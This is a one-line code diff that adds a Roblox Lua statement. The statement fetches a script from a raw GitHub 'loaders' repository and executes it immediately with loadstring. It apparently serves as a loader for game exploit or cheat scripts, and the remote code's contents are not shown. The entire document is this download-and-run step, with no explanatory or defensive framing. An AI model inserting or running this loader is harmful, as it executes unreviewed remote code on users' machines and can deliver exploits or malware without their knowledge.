@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/upd-8-cvr-retro-spam7-sbcenlm8ficn9l.lua"))()
